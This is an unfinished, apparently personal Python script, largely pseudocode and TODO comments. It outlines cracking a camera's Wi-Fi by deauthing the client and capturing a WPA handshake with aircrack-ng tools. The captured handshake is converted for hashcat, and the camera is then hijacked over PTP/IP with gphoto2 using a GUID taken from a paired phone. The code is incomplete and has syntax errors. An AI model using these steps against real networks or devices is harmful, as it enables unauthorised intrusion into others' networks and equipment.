#!/usr/bin/python3

# import dependencies
import subprocess

# file imports
import guidTools, getAuthInfo

## initialize variables
phoneIP = "10.0.0.100"
cameraIP = "10.0.0.2"
# gphoto command
gphoto2Cmd = "-L"
# location of gphoto2 settings file
gphoto2Settings = os.path.expanduser("~/Scripts/pictool/settings.conf")

#TODO: Obtain network access
############ PSUEDOCODE #################################
# references https://www.aircrack-ng.org/doku.php?id=airodump-ng
# maybe use pycrack? https://github.com/XayOn/pyrcrack
run airodump-ng on correct channel and mac n shit
if station is blank
    print client is not connected, waiting for client to connected
else
    print client is already connected, attempting deauth
    aireplay-ng client
while(aircrack exits with "no valid handshakes found, or no file or directory")
############ PSUEDOCODE #################################

# take captured cap and format for hashcat (old)
aircrack-ng psk-01.cap -J output

# take captured cap and format for hashcat 4 <- use this
subprocess.run(["/path/to/cap2hccapx.bin", "/path/to/psk-01.cap", "/path/to/output.hccapx"], stdout=subprocess.PIPE)

#TODO: call hashcat remotely
    # output the found key

#TODO: authenticate to the AP and get IP

#TODO: determine phone and camera IP address, maybe by using MAC? http://www.coffer.com/mac_find/?string=canon
# tshark -i en0 -e eth.src -Tfields -a duration:5 | sort -u | grep "3c:15:c2"

# get guid from phone, if already connected we need to disconnect or getAuthInfo will fail
rawGUID = getAuthInfo(phoneIP)

#TODO: disconnect phone

# set GUID in gphoto2 from phone
setGUID(gphoto2Settings,formatGUID(rawGUID))

### connect to camera ip and run ptp stuff via gphoto2

def runGphoto2(cameraIP,gphoto2Cmd):
    # call the gphoto2 command and print output
    subprocess.run(["gphoto2", "--port ptpip:{}".format(cameraIP), "--camera "Canon EOS 6D"", "{}".format(gphoto2Cmd)], stdout=subprocess.PIPE)

# run the gphoto2 command
runGphoto2(cameraIP,gphoto2Cmd)
